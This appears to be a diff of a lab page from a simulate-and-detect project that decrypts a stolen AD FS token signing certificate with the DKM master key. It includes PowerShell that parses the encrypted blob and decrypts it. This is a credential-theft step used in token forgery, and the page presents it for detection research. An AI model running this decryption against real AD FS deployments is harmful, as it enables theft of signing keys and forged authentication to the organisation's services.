@@ -1,19 +1,19 @@
-# Decrypt Active Directory Federation Services (AD FS) Certificates
+# Decrypt Active Directory Federation Services (AD FS) Token Signing Certificate
 
-After [exporting AD FS certificates](exportADFSCertificatesEncryptedFormat.md) and [obtaining the AD FS DKM master key](exportADFSDKMMasterKeyFromDC.md), we can use the master key value to derive a symmetric key and decrypt the AD FS certificates.
+After [extracting the AD FS token signing certificate](extractADFSTokenSigningCertificate.md) and [obtaining the AD FS DKM master key](exportADFSDKMMasterKeyFromDC.md), we can use the master key value to derive a symmetric key and decrypt AD FS certificates (Token signing and Encryption).
 
 ## Preconditions
 * Endpoint: ADFS01 or WORKSTATION6
-    * Even when this step would happen outside of the organization, we can use the same PowerShell session on one of the endpoints where we [exported AD FS certificates](exportADFSCertificatesEncryptedFormat.md) and [obtained the AD FS DKM master key](exportADFSDKMMasterKeyFromDC.md) from to go through the simulation steps.
+    * Even when this step would happen outside of the organization, we can use the same PowerShell session on one of the endpoints where we exported AD FS certificates (token signing and encryption) and [obtained the AD FS DKM master key](exportADFSDKMMasterKeyFromDC.md) from to go through the simulation steps.
     * [AD FS DKM Master Key](exportADFSDKMMasterKeyFromDC.md)
         * Use the output from this step and pass it to the PowerShell snippet below as the variable `$key`.
-    * [AD FS Certificate (Encrypted format)](exportADFSCertificatesEncryptedFormat.md)
-        * Use the output from this step and pass it to the PowerShell snippet below as the variable `$encPfx`.
+    * AD FS token signing certificate (Encrypted format)
+        * After [extracting the token signing certificate](extractADFSTokenSigningCertificate.md), the output is saved to the variable `$encTokenSigningPfx`. You can use it in the PowerShell snippets below.
 
-## Decrypt Certificate
+## Decrypt Token Signing Certificate
 
 ```PowerShell
-$encPfxBytes=[System.Convert]::FromBase64String($encPfx)
+$encPfxBytes=[System.Convert]::FromBase64String($encTokenSigningPfx)
 $guid=        $encPfxBytes[8..25]  # 18 bytes
 $KDF_oid=     $encPfxBytes[26..36] # 11 bytes
 $MAC_oid=     $encPfxBytes[37..47] # 11 byte
@@ -51,16 +51,16 @@ $cs.Close()
 $cs.Dispose()
 
 # Get the results
-$pfx = $ms.ToArray()
+$tokenSigningPfx = $ms.ToArray()
 $ms.Close()
 $ms.Dispose()
 ```
 
-![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_27_decrypt_certificate.png)
+![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_27_decrypt_token_signing_certificate.png)
 
 ## Output
 
-Use the variable `$pfx` (cipher text) for the next step where we [export the AD FS certificate as a PFX file](exportADFSCertificatesAsPfxFiles.md).
+Use the variable `$tokenSigningPfx` (cipher text) in the next step to [export the AD FS token signing certificate as a PFX file](exportADFSTokenSigningCertAsPfxFile.md).
 
 ## References
 * [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
